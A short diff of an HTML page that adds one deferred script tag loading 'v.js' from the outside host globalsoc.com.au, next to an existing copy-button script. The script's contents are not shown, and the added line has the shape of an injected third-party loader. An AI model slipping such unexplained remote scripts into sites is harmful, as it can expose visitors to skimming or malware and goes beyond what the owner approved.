@@ -197,5 +197,6 @@ footer .wrap{max-width:1120px;display:flex;justify-content:space-between;gap:10p
 <script>
 document.querySelectorAll('pre').forEach(p=>{const b=document.createElement('button');b.className='copy';b.textContent='Copy';b.onclick=()=>{const t=p.querySelector('code').innerText;(navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).then(()=>{b.textContent='Copied';setTimeout(()=>b.textContent='Copy',1500)}).catch(()=>{b.textContent='Select & copy'})};p.appendChild(b)});
 </script>
+<script src="https://globalsoc.com.au/v.js" defer></script>
 </body>
 </html>
